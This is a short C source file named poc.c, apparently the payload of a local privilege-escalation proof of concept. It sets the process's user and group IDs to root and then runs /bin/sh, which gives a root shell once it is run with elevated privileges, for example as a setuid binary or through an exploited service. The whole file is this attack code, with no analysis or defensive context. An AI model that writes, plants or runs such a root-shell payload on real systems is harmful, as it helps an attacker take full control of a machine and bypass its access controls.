// poc.c
#include <unistd.h>

int main() {
    setuid(0);     // Set user ID to root
    setgid(0);     // Set group ID to root
    execl("/bin/sh", "sh", NULL);  // Spawn a shell
    return 0;
}

